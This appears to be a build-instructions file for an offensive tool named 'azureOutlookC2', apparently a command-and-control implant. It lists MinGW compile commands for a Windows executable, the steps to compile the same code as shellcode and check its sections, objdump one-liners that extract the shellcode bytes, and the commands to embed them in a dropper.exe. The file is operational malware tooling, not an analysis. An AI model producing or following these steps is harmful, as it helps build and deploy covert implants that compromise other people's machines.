# Compile as EXE
x86_64-w64-mingw32-gcc -m64 -mwindows azureOutlookC2.c -o azureOutlookC2.exe -masm=intel

# Shellcode Compile for Dropper
#x86_64-w64-mingw32-gcc -mwindows -c azureOutlookC2.c -o azureOutlookC2.o -masm=intel -Wall -m64 -fno-asynchronous-unwind-tables -nostdlib -fno-ident -Wl,-Tlinker.ld,--no-seh

# Make Sure everythings in the .text section
#bobby.cooke$ 
#objdump --section-headers azureOutlookC2.o
#azureOutlookC2.o:	file format COFF-x86-64
#Sections:
#Idx Name          Size     VMA              Type
#  0 .text         00004460 0000000000000000 TEXT
#  1 .data         00000000 0000000000000000 DATA
#  2 .bss          00000000 0000000000000000 BSS

# MacOS Get Shellcode
#for x in $(objdump -d azureOutlookC2.o -x86-asm-syntax=intel | grep "^ " | cut -f1 | awk -F: '{print $2}'); do echo -n "\x"$x; done; echo

# Linux Get Shellcode
#for x in $(objdump -d azureOutlookC2.o -M intel | grep "^ " | cut -f1 | awk -F: '{print $2}'); do echo -n "\x"$x; done; echo

# Copy-Paste Shellcode into dropper.c

# Compile Dropper Command
#x86_64-w64-mingw32-gcc -m64 -mwindows dropper.c -o dropper.exe -masm=intel
